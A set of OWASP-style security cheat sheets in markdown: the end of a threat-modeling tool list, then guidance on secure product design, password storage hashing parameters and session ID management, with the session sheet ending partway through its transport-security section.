- [Cairis](https://github.com/cairis-platform/cairis)
- [draw.io](https://draw.io) - see also [threat modeling libraries](https://github.com/michenriksen/drawio-threatmodeling) for the tool
- [IriusRisk](https://www.iriusrisk.com/) - offers a free Community Edition
- [Microsoft Threat Modeling Tool](https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool)
- [OWASP's Threat Dragon](https://github.com/OWASP/threat-dragon)
- [OWASP's pytm](https://owasp.org/www-project-pytm/)
- [TaaC-AI](https://github.com/yevh/TaaC-AI) - AI-driven Threat modeling-as-a-Code (TaaC)
- Threat Composer - [Demo](https://awslabs.github.io/threat-composer), [Repository](https://github.com/awslabs/threat-composer/)

### General Reference

- [Awesome Threat Modeling](https://github.com/hysnsec/awesome-threat-modelling) - resource list
- [Tactical Threat Modeling](https://safecode.org/wp-content/uploads/2017/05/SAFECode_TM_Whitepaper.pdf)
- [Threat Modeling: A Summary of Available Methods](https://insights.sei.cmu.edu/library/threat-modeling-a-summary-of-available-methods/)
- Threat modeling for builders, free online training available on [AWS SkillBuilder](https://explore.skillbuilder.aws/learn/course/external/view/elearning/13274/threat-modeling-for-builders-workshop), and [AWS Workshop Studio](https://catalog.workshops.aws/threatmodel/en-US)
- [Threat Modeling Handbook](https://security.cms.gov/policy-guidance/threat-modeling-handbook)
- [Threat Modeling Process](https://owasp.org/www-community/Threat_Modeling_Process)
- [The Ultimate Beginner's Guide to Threat Modeling](https://shostack.org/resources/threat-modeling)


---
# Secure_Product_Design_Cheat_Sheet.md

# Secure Product Design Cheat Sheet

## Introduction

The purpose of Secure Product Design is to ensure that all products meet or exceed the security requirements laid down by the organization as part of the development lifecycle and to ensure that all security decisions made about the product being developed are explicit choices and result in the correct level of security for the product being developed.

## Methodology

As a basic start, establish secure defaults, minimise the attack surface area, and fail securely to those well-defined and understood defaults.

Secure Product Design comes about through two processes:

1. **_Product Inception_**; and
2. **_Product Design_**

The first process happens when a product is conceived, or when an existing product is being re-invented. The latter is continuous, evolutionary, and done in an agile way, close to where the code is being written.

## Security Principles

### 1. The principle of Least Privilege and Separation of Duties

Least Privilege is a security principle that states that users should only be given the minimum amount of access necessary to perform their job. This means that users should only be given access to the resources they need to do their job, and no more. This helps to reduce the risk of unauthorized access to sensitive data or systems, as users are only able to access the resources they need. Least Privilege is an important security principle that should be followed in order to ensure the security of an organization's data and systems.

Separation of duties is a fundamental principle of internal control in business and organizations. It is a system of checks and balances that ensures that no single individual has control over all aspects of a transaction. This is done by assigning different tasks to different people, so that no one person has control over the entire process. This helps to reduce the risk of fraud and errors, as well as ensuring that all tasks are completed in a timely manner. Separation of duties is an important part of any organization's internal control system, and is essential for maintaining the integrity of the organization's financial records.

### 2. The principle of Defense-in-Depth

The principle of Defense-in-Depth is a security strategy that involves multiple layers of security controls to protect an organization’s assets. It is based on the idea that if one layer of security fails, the other layers will still be able to protect the asset. The layers of security can include physical security, network security, application security, and data security. The goal of Defense-in-Depth is to create a secure environment that is resilient to attack and can quickly detect and respond to any security incidents. By implementing multiple layers of security, organizations can reduce the risk of a successful attack and minimize the damage caused by any successful attack.

### 3. The principle of Zero Trust

Zero Trust is a security model that assumes that all users, devices, and networks are untrusted and must be verified before access is granted. It is based on the idea that organizations should not trust any user, device, or network, even if they are inside the organization’s network. Instead, all requests for access must be authenticated and authorized before access is granted. Zero Trust also requires organizations to continuously monitor and audit user activity to ensure that access is only granted to those who need it. This model is designed to reduce the risk of data breaches and other security incidents by ensuring that only authorized users have access to sensitive data.

### 4. The principle of Security-in-the-Open

Security-in-the-Open is a concept that emphasizes the importance of security in open source software development. It focuses on the need for developers to be aware of the security implications of their code and to take steps to ensure that their code is secure. This includes using secure coding practices, testing for vulnerabilities, and using secure development tools. Security-in-the-Open also encourages developers to collaborate with security experts to ensure that their code is secure.

## Security Focus Areas

### 1. Context

Where does this application under consideration fit into the ecosystem of the organization, which departments use it and for what reason? What kinds of data might it contain, and what is the risk profile as a result?

The processes employed to build the security context for an application include [Threat Modeling](Threat_Modeling_Cheat_Sheet.md) - which results in security related stories being added during **_Product Design_** at every iteration of _product delivery_ - and when performing a Business Impact Assessment - which results in setting the correct Product Security Levels for a given product during **_Product Inception_**.

Context is all important because over-engineering for security can have even greater cost implications than over-engineering for scale or performance, but under-engineering can have devastating consequences too.

### 2. Components

From libraries in use by the application (selected during any **_Product Design_** stage) through to external services it might make use of (changing of which happen during **_Product Inception_**), what makes up this application and how are those parts kept secure? In order to do this we leverage a library of secure design patterns and ready to use components defined in your Golden Path / Paved Road documentation and by analyzing those choices through [Threat Modeling](Threat_Modeling_Cheat_Sheet.md).

A part of this component review must also include the more commercial aspects of selecting the right components (licensing and maintenance) as well as the limits on usage that might be required.

### 3. Connections

How do you interact with this application and how does it connect to those components and services mentioned before? Where is the data stored and how is it accessed? Connections can also describe any intentional lack of connections. Think about the segregation of tiers that might be required depending on the Product Security Levels required and the potential segregation of data or whole environments if required for different tenants.

Adding (or removing) connections is probably a sign that **_Product Inception_** is happening.

### 4. Code

Code is the ultimate expression of the intention for a product and as such it must be functional first and foremost. But there is a quality to how that functionality is provided that must meet or exceed the expectations of it.

Some basics of secure coding include:

   1. Input validation: Verify that all input data is valid and of the expected type, format, and length before processing it. This can help prevent attacks such as SQL injection and buffer overflows.
   2. Error handling: Handle errors and exceptions in a secure manner, such as by logging them in a secure way and not disclosing sensitive information to an attacker.
   3. Authentication and Authorization: Implement strong authentication and authorization mechanisms to ensure that only authorized users can access sensitive data and resources.
   4. Cryptography: Use cryptographic functions and protocols to protect data in transit and at rest, such as HTTPS and encryption - the expected levels for a given Product Security Level can often be found by reviewing your Golden Path / Paved Road documentation.
   5. Least privilege: Use the principle of the least privilege when writing code, such that the code and the system it runs on are given the minimum access rights necessary to perform their functions.
   6. Secure memory management: Use high-level languages recommended in your Golden Path / Paved Road documentation or properly manage memory to prevent memory-related vulnerabilities such as buffer overflows and use-after-free.
   7. Avoiding hardcoded secrets: Hardcoded secrets such as passwords and encryption keys should be avoided in the code and should be stored in a secure storage.
   8. Security testing: Test the software for security vulnerabilities during development and just prior to deployment.
   9. Auditing and reviewing the code: Regularly audit and review the code for security vulnerabilities, such as by using automated tools or having a third party review the code.
   10. Keeping up-to-date: Keep the code up-to-date with the latest security best practices and vulnerability fixes to ensure that the software is as secure as possible.

Ensure that you integrate plausibility checks at each tier of your application (e.g., from frontend to backend) and ensure that you write unit and integration tests to validate that all threats discovered during [Threat Modeling](Threat_Modeling_Cheat_Sheet.md) have been mitigated to a level of risk acceptable to the organization. Use that to compile use-cases and [abuse-cases](Abuse_Case_Cheat_Sheet.md) for each tier of your application.

### 5. Configuration

Building an application securely can all too easily be undone if it's not securely configured. At a minimum we should ensure the following:

1. Bearing in mind the principle of Least Privilege: Limit the access and permissions of system components and users to the minimum required to perform their tasks.
2. Remembering Defense-in-Depth: Implement multiple layers of security controls to protect against a wide range of threats.
3. Ensuring Secure by Default: Configure systems and software to be secure by default, with minimal manual setup or configuration required.
4. Secure Data: Protect sensitive data, such as personal information and financial data, by encrypting it in transit and at rest. Protecting that data also means ensuring it's correctly backed up and that the data retention is set correctly for the desired Product Security Level.
5. Plan to have the configuration Fail Securely: Design systems to fail in a secure state, rather than exposing vulnerabilities when they malfunction.
6. Always use Secure Communications: Use secure protocols for communication, such as HTTPS, to protect against eavesdropping and tampering.
7. Perform regular updates - or leverage [maintained images](https://www.cisecurity.org/cis-hardened-images): Keeping software, docker images and base operating systems up-to-date with the [latest security patches](https://csrc.nist.gov/publications/detail/sp/800-40/rev-4/final) is an essential part of maintaining a secure system.
8. Have a practiced Security Incident response plan: Having a plan in place for how to respond to a security incident is essential for minimizing the damage caused by any successful attack and a crucial part of the Product Support Model.

Details of how to precisely ensure secure configuration can be found in [Infrastructure as Code Security Cheat Sheet](Infrastructure_as_Code_Security_Cheat_Sheet.md)


---
# Password_Storage_Cheat_Sheet.md

# Password Storage Cheat Sheet

## Introduction

This cheat sheet advises you on the proper methods for storing passwords for authentication. When passwords are stored, they must be protected from an attacker even if the application or database is compromised. Fortunately, a majority of modern languages and frameworks provide built-in functionality to help store passwords safely.

However, once an attacker has acquired stored password hashes, they are always able to brute force hashes offline. Defenders can slow down offline attacks by selecting hash algorithms that are as resource intensive as possible.

To sum up our recommendations:

- **Use [Argon2id](#argon2id) with a minimum configuration of 19 MiB of memory, an iteration count of 2, and 1 degree of parallelism.**
- **If [Argon2id](#argon2id) is not available, use [scrypt](#scrypt) with a minimum CPU/memory cost parameter of (2^17), a minimum block size of 8 (1024 bytes), and a parallelization parameter of 1.**
- **For legacy systems using [bcrypt](#bcrypt), use a work factor of 10 or more and with a password limit of 72 bytes.**
- **If FIPS-140 compliance is required, use [PBKDF2](#pbkdf2) with a work factor of 600,000 or more and set with an internal hash function of HMAC-SHA-256.**
- **Consider using a [pepper](#peppering) to provide additional defense in depth (though alone, it provides no additional secure characteristics).**

## Background

### Hashing vs Encryption

Hashing and encryption can keep sensitive data safe, but in almost all circumstances, **passwords should be hashed, NOT encrypted.**

Because **hashing is a one-way function** (i.e., it is impossible to "decrypt" a hash and obtain the original plaintext value), it is the most appropriate approach for password validation. Even if an attacker obtains the hashed password, they cannot use it to log in as the victim.

Since **encryption is a two-way function**, attackers can retrieve the original plaintext from the encrypted data. It can be used to store data such as a user's address since this data is displayed in plaintext on the user's profile. Hashing their address would result in a garbled mess.

 The only time encryption should be used in passwords is in edge cases where it is necessary to obtain the original plaintext password. This might be necessary if the application needs to use the password to authenticate with another system that does not support a modern way to programmatically grant access, such as OpenID Connect (OIDC). Wherever possible, an alternative architecture should be used to avoid the need to store passwords in an encrypted form.

For further guidance on encryption, see the [Cryptographic Storage Cheat Sheet](Cryptographic_Storage_Cheat_Sheet.md).

### When Password Hashes Can Be Cracked

**Strong passwords stored with modern hashing algorithms and using hashing best practices should be effectively impossible for an attacker to crack.**  It is your responsibility as an application owner to select a modern hashing algorithm.

However, there are some situations where an attacker can "crack" the hashes in some circumstances by doing the following:

- Selecting a password you think the victim has chosen (e.g.`password1!`)
- Calculating the hash
- Comparing the hash you calculated to the hash of the victim. If they match, you have correctly "cracked" the hash and now know the plaintext value of their password.

Usually, the attacker will repeat this process with a list of large number of potential candidate passwords, such as:

- Lists of passwords obtained from other compromised sites
- Brute force (trying every possible candidate)
- Dictionaries or wordlists of common passwords

While the number of permutations can be enormous, with high speed hardware (such as GPUs) and cloud services with many servers for rent, the cost to an attacker is relatively small to do successful password cracking, especially when best practices for hashing are not followed.

## Methods for Enhancing Password Storage

### Salting

A salt is a unique, randomly generated string that is added to each password as part of the hashing process. As the salt is unique for every user, an attacker has to crack hashes one at a time using the respective salt rather than calculating a hash once and comparing it against every stored hash. This makes cracking large numbers of hashes significantly harder, as the time required grows in direct proportion to the number of hashes.

Salting also protects against an attacker's pre-computing hashes using rainbow tables or database-based lookups. Finally, salting means that it is impossible to determine whether two users have the same password without cracking the hashes, as the different salts will result in different hashes even if the passwords are the same.

At the algorithm and specification level, modern password hashing functions such as [Argon2id](#argon2id), [bcrypt](#bcrypt), and [PBKDF2](#pbkdf2) require the caller to provide a salt.
However, most widely used implementations and libraries automatically generate and manage salts internally, so application developers typically do not need to handle salt generation manually when using these libraries correctly.

### Peppering

[Peppering](https://datatracker.ietf.org/doc/html/draft-ietf-kitten-password-storage-07#section-4.2) is a class of strategies that can be used in addition to salting to provide an additional layer of protection. It prevents an attacker from being able to crack any of the hashes if they only have access to the database, for example, if they have exploited a SQL injection vulnerability or obtained a backup of the database.

#### Common requirements for peppering strategies

- A pepper is **shared between stored passwords**, rather than being *unique* to an individual password like a password salt.
- Unlike a password salt, the pepper should not be public and **should not be stored along with the generated hash**. The pepper should be stored separately from the password database.
- Peppers are secrets and should be stored in "secrets vaults" or HSMs (Hardware Security Modules). See the [Secrets Management Cheat Sheet](Secrets_Management_Cheat_Sheet.md) for more information on securely storing secrets.
- In the event of a pepper's compromise, the pepper will have to be changed. Peppers cannot be changed without knowledge of a user's password. Therefore changing a pepper will require forcing all users whose passwords were protected by the previous pepper to reset their passwords.

#### Pre-hashing peppers

In this strategy, a pepper is added to a password before being hashed by a password hashing algorithm. The computed hash is then stored in the database. In this case the pepper should be a random value generated securely. See the [Cryptographic_Storage_Cheat_Sheet](Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation) for more information on securely generating random values.

#### Post-hashing peppers

In this strategy, a password is hashed as usual using a password hashing algorithm. The resulting password hash is then hashed again using an HMAC (e.g., HMAC-SHA256, HMAC-SHA512, depending on the desired output length) before storing the resulting hash in the database. In this case the pepper is acting as the HMAC key and should be generated as per requirements of the HMAC algorithm.

### Using Work Factors

 The work factor is the number of iterations of the hashing algorithm that are performed for each password (usually, it's actually `2^work` iterations). The work factor is typically stored in the hash output. It makes calculating the hash more computationally expensive, which in turn reduces the speed and/or increases the cost for which an attacker can attempt to crack the password hash.

When you choose a work factor, strike a balance between security and performance. Though higher work factors make hashes more difficult for an attacker to crack, they will slow down the process of verifying a login attempt. If the work factor is too high, the performance of the application may be degraded, which could be used by an attacker to carry out a denial of service attack by exhausting the server's CPU with a large number of login attempts.

There is no golden rule for the ideal work factor - it will depend on the performance of the server and the number of users on the application. Determining the optimal work factor will require experimentation on the specific server(s) used by the application. As a general rule, calculating a hash should take less than one second.

#### Upgrading the Work Factor

One key advantage of having a work factor is that it can be increased over time as hardware becomes more powerful and cheaper.

The most common approach to upgrading the work factor is to wait until the user next authenticates, then re-hash their password with the new work factor. The different hashes will have different work factors and hashes may never be upgraded if the user doesn't log back into the application. Depending on the application, it may be appropriate to remove the older password hashes and require users to reset their passwords next time they need to login in order to avoid storing older and less secure hashes.

## Password Hashing Algorithms

Some modern hashing algorithms have been specifically designed to securely store passwords. This means that they should be slow (unlike algorithms such as MD5 and SHA-1, which were designed to be fast), and you can change how slow they are by changing the work factor.

You do not need to hide which password hashing algorithm is used by an application. If you utilize a modern password hashing algorithm with proper configuration parameters, it should be safe to state in public which password hashing algorithms are in use and be listed [here](https://pulse.michalspacek.cz/passwords/storages).

Three hashing algorithms that should be considered:

### Argon2id

[Argon2](https://en.wikipedia.org/wiki/Argon2) was the winner of the 2015 [Password Hashing Competition](https://en.wikipedia.org/wiki/Password_Hashing_Competition). Out of the three Argon2 versions, use the  Argon2id variant since it provides a balanced approach to resisting both side-channel and GPU-based attacks.

Rather than a simple work factor like other algorithms, Argon2id has three different parameters that can be configured: the base minimum of the minimum memory size (m), the minimum number of iterations (t), and the degree of parallelism (p). We recommend the following configuration settings:

- m=47104 (46 MiB), t=1, p=1 (Do not use with Argon2i)
- m=19456 (19 MiB), t=2, p=1 (Do not use with Argon2i)
- m=12288 (12 MiB), t=3, p=1
- m=9216 (9 MiB), t=4, p=1
- m=7168 (7 MiB), t=5, p=1

These configuration settings provide an equal level of defense, and the only difference is a trade off between CPU and RAM usage.

### scrypt

[scrypt](http://www.tarsnap.com/scrypt/scrypt.pdf) is a password-based key derivation function created by [Colin Percival](https://twitter.com/cperciva). While [Argon2id](#argon2id) should be the best choice for password hashing, [scrypt](#scrypt) should be used when the former is not available.

Like [Argon2id](#argon2id), scrypt has three different parameters that can be configured: the minimum CPU/memory cost parameter (N), the blocksize (r) and the degree of parallelism (p). Use one of the following settings:

- N=2^17 (128 MiB), r=8 (1024 bytes), p=1
- N=2^16 (64 MiB), r=8 (1024 bytes), p=2
- N=2^15 (32 MiB), r=8 (1024 bytes), p=3
- N=2^14 (16 MiB), r=8 (1024 bytes), p=5
- N=2^13 (8 MiB), r=8 (1024 bytes), p=10

These configuration settings provide an equal level of defense. The only difference is a trade off between CPU and RAM usage.

### bcrypt

The [bcrypt](https://en.wikipedia.org/wiki/bcrypt) password hashing function **should only** be used for password storage in legacy systems where Argon2 and scrypt are not available.

The work factor should be as large as verification server performance will allow, with a minimum of 10.

#### Input Limits of bcrypt

bcrypt has a maximum length input length of 72 bytes [for most implementations](https://security.stackexchange.com/questions/39849/does-bcrypt-have-a-maximum-password-length), so you should enforce a maximum password length of 72 bytes (or less if the bcrypt implementation in use has smaller limits).

#### Pre-Hashing Passwords with bcrypt

An alternative approach is to pre-hash the user-supplied password with a fast algorithm such as SHA-2, HMAC, or BLAKE3 and then to hash the resulting hash value with bcrypt (i.e., `bcrypt(H($password)), $salt, $cost)`)..
This can be **dangerous** because of null bytes in the hash output value and because of [password shucking](https://www.youtube.com/watch?v=OQD3qDYMyYQ).

The original bcrypt expects a null terminated password string, this means that the hash value will only be used to the first null byte in the hash value. (`bcrypt(H($password)), $salt, $cost) == bcrypt("", $salt, $cost)` if `H($password)[0] == 0`)
This increases the chance of finding a collision when [combining bcrypt with other hash functions](https://blog.ircmaxell.com/2015/03/security-issue-combining-bcrypt-with.html) and can be avoided by encoding the hash value to printable string with something like base64.
base64 can increases the length of the hash value above 72 characters and so there is a bit of truncation for large hash values from hashes like SHA-512, this is [negligible](https://soatok.blog/2024/11/27/beyond-bcrypt/).

Password shucking uses the fact, that it is easy to check if  `bcrypt(base64(H($password))), $salt, $cost) == bcrypt(base64($leaked_hash), $salt, $cost)`.
If the inner hash function `H` is used with the same password somewhere else and known to an attacker cracking the password can be reduced to breaking the hash function `H`.
Just using pure SHA-512, ( i.e. `bcrypt(base64(sha512($password))), $salt, $cost)`) is a **dangerous practice** and is as secure as just using pure SHA-512.
Password shucking only works if a leaked hash is known to the attacker, either through a breach database or rainbow tables.
To mitigate password shucking a [pepper](#peppering) can be used.

To summarize if bcrypt has to be used and the password should to be pre-hashed you should do `bcrypt(base64(hmac-sha384(data:$password, key:$pepper)), $salt, $cost)` and store the pepper not in the database.

### PBKDF2

Since [PBKDF2](https://en.wikipedia.org/wiki/PBKDF2) is recommended by [NIST](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecretver) and has FIPS-140 validated implementations, so it should be the preferred algorithm when these are required.

The PBKDF2 algorithm requires that you select an internal hashing algorithm such as an HMAC or a variety of other hashing algorithms. HMAC-SHA-256 is widely supported and is recommended by NIST.

The work factor for PBKDF2 is implemented through an iteration count, which should set differently based on the internal hashing algorithm used.

- PBKDF2-HMAC-SHA1: 1,300,000 iterations
- PBKDF2-HMAC-SHA256: 600,000 iterations
- PBKDF2-HMAC-SHA512: 210,000 iterations

### Parallel PBKDF2

- PPBKDF2-SHA512: cost 2
- PPBKDF2-SHA256: cost 5
- PPBKDF2-SHA1: cost 10

These configuration settings are equivalent in the defense they provide. ([Number as of december 2022, based on testing of RTX 4000 GPUs](https://tobtu.com/minimum-password-settings/))

#### PBKDF2 Pre-Hashing

When PBKDF2 is used with an HMAC, and the password is longer than the hash function's block size (64 bytes for SHA-256), the password will be automatically pre-hashed. For example, the password "This is a password longer than 512 bits which is the block size of SHA-256" is converted to the hash value (in hex): `fa91498c139805af73f7ba275cca071e78d78675027000c99a9925e2ec92eedd`.

Good implementations of PBKDF2 perform pre-hashing before the expensive iterated hashing phase. However, some implementations perform the conversion on each iteration, which can make hashing long passwords significantly more expensive than hashing short passwords. When users supply very long passwords, a potential denial of service vulnerability could occur, such as the one published in [Django](https://www.djangoproject.com/weblog/2013/sep/15/security/) during 2013. Manual pre-hashing can reduce this risk but requires adding a [salt](#salting) to the pre-hash step.

## Upgrading Legacy Hashes

Older applications that use less secure hashing algorithms, such as MD5 or SHA-1, can be upgraded to modern password hashing algorithms as described above. When the users enter their password (usually by authenticating on the application), that input should be re-hashed using the new algorithm. Defenders should expire the users' current password and require them to enter a new one, so that any older (less secure) hashes of their password are no longer useful to an attacker.

However, this means that old (less secure) password hashes will be stored in the database until the user logs in. You can take one of two approaches to avoid this dilemma.

Upgrade Method One: Expire and delete the password hashes of users who have been inactive for an extended period and require them to reset their passwords to login again. Although secure, this approach is not particularly user-friendly. Expiring the passwords of many users may cause issues for support staff or may be interpreted by users as an indication of a breach.

Upgrade Method Two: Use the existing password hashes as inputs for a more secure algorithm. For example, if the application originally stored passwords as `md5($password)`, this could be easily upgraded to `bcrypt(md5($password))`. Layering the hashes avoids the need to know the original password; however, it can make the hashes easier to crack. These hashes should be replaced with direct hashes of the users' passwords next time the user logs in.

Remember that once your password hashing method is selected, it will have to be upgraded in the future, so ensure that upgrading your hashing algorithm is as easy as possible. During the transition period, allow for a mix of old and new hashing algorithms. Using a mix of hashing algorithms is easier if the password hashing algorithm and work factor are stored with the password using a standard format, for example, the [modular PHC string format](https://github.com/P-H-C/phc-string-format/blob/master/phc-sf-spec.md).

### International Characters

Your hashing library must be able to accept a wide range of characters and should be compatible with all Unicode codepoints, so users can use the full range of characters available on modern devices - especially mobile keyboards. They should be able to select passwords from various languages and include pictograms. Prior to hashing the entropy of the user's entry should not be reduced, and password hashing libraries need to be able to use input that may contain a NULL byte.


---
# Session_Management_Cheat_Sheet.md

# Session Management Cheat Sheet

## Introduction

**Web Authentication, Session Management, and Access Control**:

A web session is a sequence of network HTTP request and response transactions associated with the same user. Modern and complex web applications require the retaining of information or status about each user for the duration of multiple requests. Therefore, sessions provide the ability to establish variables – such as access rights and localization settings – which will apply to each and every interaction a user has with the web application for the duration of the session.

Web applications can create sessions to keep track of anonymous users after the very first user request. An example would be maintaining the user language preference. Additionally, web applications will make use of sessions once the user has authenticated. This ensures the ability to identify the user on any subsequent requests as well as being able to apply security access controls, authorized access to the user private data, and to increase the usability of the application. Therefore, current web applications can provide session capabilities both pre and post authentication.

Once an authenticated session has been established, the session ID (or token) is temporarily equivalent to the strongest authentication method used by the application, such as username and password, passphrases, one-time passwords (OTP), client-based digital certificates, smartcards, or biometrics (such as fingerprint or eye retina). See the OWASP [Authentication Cheat Sheet](Authentication_Cheat_Sheet.md).

HTTP is a stateless protocol ([RFC2616](https://www.ietf.org/rfc/rfc2616.txt) section 5), where each request and response pair is independent of other web interactions. Therefore, in order to introduce the concept of a session, it is required to implement session management capabilities that link both the authentication and access control (or authorization) modules commonly available in web applications:

![SessionDiagram](../assets/Session_Management_Cheat_Sheet_Diagram.png)

The session ID or token binds the user authentication credentials (in the form of a user session) to the user HTTP traffic and the appropriate access controls enforced by the web application. The complexity of these three components (authentication, session management, and access control) in modern web applications, plus the fact that its implementation and binding resides on the web developer's hands (as web development frameworks do not provide strict relationships between these modules), makes the implementation of a secure session management module very challenging.

The disclosure, capture, prediction, brute force, or fixation of the session ID will lead to session hijacking (or sidejacking) attacks, where an attacker is able to fully impersonate a victim user in the web application. Attackers can perform two types of session hijacking attacks, targeted or generic. In a targeted attack, the attacker's goal is to impersonate a specific (or privileged) web application victim user. For generic attacks, the attacker's goal is to impersonate (or get access as) any valid or legitimate user in the web application.

## Session ID Properties

In order to keep the authenticated state and track the users progress within the web application, applications provide users with a **session identifier** (session ID or token) that is assigned at session creation time, and is shared and exchanged by the user and the web application for the duration of the session (it is sent on every HTTP request). The session ID is a `name=value` pair.

With the goal of implementing secure session IDs, the generation of identifiers (IDs or tokens) must meet the following properties.

### Session ID Name Fingerprinting

The name used by the session ID should not be extremely descriptive nor offer unnecessary details about the purpose and meaning of the ID.

The session ID names used by the most common web application development frameworks [can be easily fingerprinted](https://wiki.owasp.org/index.php/Category:OWASP_Cookies_Database), such as `PHPSESSID` (PHP), `JSESSIONID` (J2EE), `CFID` & `CFTOKEN` (ColdFusion), `ASP.NET_SessionId` (ASP .NET), etc. Therefore, the session ID name can disclose the technologies and programming languages used by the web application.

It is recommended to change the default session ID name of the web development framework to a generic name, such as `id`.

### Session ID Entropy

Session identifiers must have at least `64 bits` of entropy to prevent brute-force session guessing attacks. Entropy refers to the amount of randomness or unpredictability in a value. Each “bit” of entropy doubles the number of possible outcomes, meaning a session ID with 64 bits of entropy can have `2^64` possible values.

A strong [CSPRNG](https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator) (Cryptographically Secure Pseudorandom Number Generator) must be used to generate session IDs. This ensures the generated values are evenly distributed among all possible values. Otherwise, attackers may be able to use statistical analysis techniques to identify patterns in how the session IDs are created, effectively reducing the entropy and allowing the attacker to guess or predict valid session IDs more easily.

**NOTE**:

- The expected time for an attacker to brute-force a valid session ID depends on factors such as the number of bits of entropy, the number of active sessions, session expiration times, and the attacker's guessing rate.
- If a web application generates session IDs with 64 bits of entropy, an attacker can expect to spend approximately 585 years to successfully guess a valid session ID, assuming the attacker can try 10,000 guesses per second with 100,000 valid simultaneous sessions available in the application.
- Further analysis of the expected time for an attacker to brute-force session identifiers is available [here](https://owasp.org/www-community/vulnerabilities/Insufficient_Session-ID_Length#estimating-attack-time).

### Session ID Length

As mentioned in the previous *Session ID Entropy* section, a primary security requirement for session IDs is that they contain at least `64 bits` of entropy to prevent brute-force guessing attacks. Although session ID length matters, it's the entropy that ensures security. The session ID must be long enough to encode sufficient entropy, preventing brute force attacks where an attacker guesses valid session IDs.

Different encoding methods can result in different lengths for the same amount of entropy. Session IDs are often represented using hexadecimal encoding. When using hexadecimal encoding, a session ID must be at least 16 hexadecimal characters long to achieve the required 64 bits of entropy.  When using different encodings (e.g. Base64 or [Microsoft's encoding for ASP.NET session IDs](https://docs.microsoft.com/en-us/dotnet/api/system.web.sessionstate.sessionidmanager?redirectedfrom=MSDN&view=netframework-4.7.2)) a different number of characters may be required to represent the minimum 64 bits of entropy.

It’s important to note that if any part of the session ID is fixed or predictable, the effective entropy is reduced, and the length may need to be increased to compensate. For example, if half of a 16-character hexadecimal session ID is fixed, only the remaining 8 characters are random, providing just 32 bits of entropy — which is insufficient for strong security. To maintain security, ensure that the entire session ID is randomly generated and unpredictable, or increase the overall length if parts of the ID are not random.

**NOTE**:

- More information about the relationship between Session ID Length and Session ID Entropy is available [here](https://owasp.org/www-community/vulnerabilities/Insufficient_Session-ID_Length#session-id-length-and-entropy-relationship).

### Session ID Content (or Value)

The session ID content (or value) must be meaningless to prevent information disclosure attacks, where an attacker is able to decode the contents of the ID and extract details of the user, the session, or the inner workings of the web application.

The session ID must simply be an identifier on the client side, and its value must never include sensitive information or Personally Identifiable Information (PII). To read more about PII, refer to [Wikipedia](https://en.wikipedia.org/wiki/Personally_identifiable_information) or this [post](https://www.idshield.com/blog/identity-theft/what-pii-and-why-should-i-care/).

The meaning and business or application logic associated with the session ID must be stored on the server side, and specifically, in session objects or in a session management database or repository.

The stored information can include the client IP address, User-Agent, email, username, user ID, role, privilege level, access rights, language preferences, account ID, current state, last login, session timeouts, and other internal session details. If the session objects and properties contain sensitive information, such as credit card numbers, it is required to duly encrypt and protect the session management repository.

It is recommended to use the session ID created by your language or framework. If you need to create your own sessionID, use a cryptographically secure pseudorandom number generator (CSPRNG) with a size of at least 128 bits and ensure that each sessionID is unique.

## Session Management Implementation

The session management implementation defines the exchange mechanism that will be used between the user and the web application to share and continuously exchange the session ID. There are multiple mechanisms available in HTTP to maintain session state within web applications, such as cookies (standard HTTP header), URL parameters (URL rewriting – [RFC2396](https://www.ietf.org/rfc/rfc2396.txt)), URL arguments on GET requests, body arguments on POST requests, such as hidden form fields (HTML forms), or proprietary HTTP headers.

The preferred session ID exchange mechanism should allow defining advanced token properties, such as the token expiration date and time, or granular usage constraints. This is one of the reasons why cookies (RFCs [2109](https://www.ietf.org/rfc/rfc2109.txt) & [2965](https://www.ietf.org/rfc/rfc2965.txt) & [6265](https://www.ietf.org/rfc/rfc6265.txt)) are one of the most extensively used session ID exchange mechanisms, offering advanced capabilities not available in other methods.

The usage of specific session ID exchange mechanisms, such as those where the ID is included in the URL, might disclose the session ID (in web links and logs, web browser history and bookmarks, the Referer header or search engines), as well as facilitate other attacks, such as the manipulation of the ID or [session fixation attacks](https://www.acrossecurity.com/papers/session_fixation.pdf).

### Built-in Session Management Implementations

Web development frameworks, such as J2EE, ASP .NET, PHP, and others, provide their own session management features and associated implementation. It is recommended to use these built-in frameworks versus building a home made one from scratch, as they are used worldwide on multiple web environments and have been tested by the web application security and development communities over time.

However, be advised that these frameworks have also presented vulnerabilities and weaknesses in the past, so it is always recommended to use the latest version available, that potentially fixes all the well-known vulnerabilities, as well as review and change the default configuration to enhance its security by following the recommendations described along this document.

The storage capabilities or repository used by the session management mechanism to temporarily save the session IDs must be secure, protecting the session IDs against local or remote accidental disclosure or unauthorized access.

### Used vs. Accepted Session ID Exchange Mechanisms

A web application should make use of cookies for session ID exchange management. If a user submits a session ID through a different exchange mechanism, such as a URL parameter, the web application should avoid accepting it as part of a defensive strategy to stop session fixation.

**NOTE**:

- Even if a web application makes use of cookies as its default session ID exchange mechanism, it might accept other exchange mechanisms too.
- It is therefore required to confirm via thorough testing all the different mechanisms currently accepted by the web application when processing and managing session IDs, and limit the accepted session ID tracking mechanisms to just cookies.
- In the past, some web applications used URL parameters, or even switched from cookies to URL parameters (via automatic URL rewriting), if certain conditions are met (for example, the identification of web clients without support for cookies or not accepting cookies due to user privacy concerns).

### Transport Layer Security

In order to protect the session ID exchange from active eavesdropping and passive disclosure in the network traffic, it is essential to use an encrypted HTTPS (TLS) connection for the entire web session, not only for the authentication process where the user credentials are exchanged. This may be mitigated by [HTTP Strict Transport Security (HSTS)](HTTP_Strict_Transport_Security_Cheat_Sheet.md) for a client that supports it.

Additionally, the `Secure` [cookie attribute](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies) must be used to ensure the session ID is only exchanged through an encrypted channel. The usage of an encrypted communication channel also protects the session against some session fixation attacks where the attacker is able to intercept and manipulate the web traffic to inject (or fix) the session ID on the victim's web browser.

The following set of best practices are focused on protecting the session ID (specifically when cookies are used) and helping with the integration of HTTPS within the web application:

- Do not switch a given session from HTTP to HTTPS, or vice-versa, as this will disclose the session ID in the clear through the network.
    - When redirecting to HTTPS, ensure that the cookie is set or regenerated **after** the redirect has occurred.
- Do not mix encrypted and unencrypted contents (HTML pages, images, CSS, JavaScript files, etc) in the same page, or from the same domain.
